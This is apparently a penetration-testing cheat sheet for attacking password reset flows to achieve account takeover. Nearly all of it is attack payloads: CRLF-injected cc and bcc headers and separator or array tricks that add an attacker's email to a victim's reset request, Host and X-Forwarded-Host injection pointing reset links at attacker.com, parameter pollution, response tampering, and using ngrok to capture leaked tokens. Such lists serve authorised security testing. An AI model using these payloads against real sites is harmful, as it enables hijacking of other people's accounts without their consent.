# Password Reset Functionality

## Tips And Trick
   - Analyze the Token and the pattern if its possible to achive ATO
   - Check for token leak in header especially in referrer header
   - Use Forwarded Host header if it works use ngrok to capture the request to achive 1 click ATO
   - Use HTTP Parameter Pollution
   - Intercept Response To valid one
     1. notice that the response manipulation must same with valid response Dont just change the verb and status code
   - Use Carbon Copy attack
     1. victim@xyz.tld >> victim@xyz.tld%0a%0dcc:hacker@xyz.tld or victim@xyz.tld&cc:hacker@xyz.tld or victim@xyz.tld%0a%0dbcc:hacker@xyz.tld or       victim@xyz.tld&bcc:hacker@xyz.tld
   - Host headerInjection
   
    ```
    Host: target.com
    Host: attacker.com
    or
    Host: target.com
    X-Forwarded-Host: attacker.com
    Or
    Host: attacker.com
    ```
   - Use separator , %20 | %00 :
     1. victim@xyz.tld,hacker@xyz.tld / victim@xyz.tld|hacker@xyz.tld / victim@xyz.tld:hacker@xyz.tld / victim@xyz.tld%00hacker@xyz.tld / victim@xyz.tld%20hacker@xyz.tld
     2. email="victim@mail.tld",email="attacker@mail.tld" 
   - Use Null or nil value
   - Use long string to trigger error
   - Broken JSON payload : -*-*-*--""---*-*;*;*-*--*-*;*;*-*-*+;**;;*+*+*!*!*+*++*;*;*+*+*+*++*;
   - Check for IDOR
   - Use Array index 
     1. email[0]=victim@email.com&email[1]=attacker@email.com
     2. FOr JSON : {email:[victim,attacker]}
   - Check for no rate limit
   - Check for session expiration
   - Check for token expiration
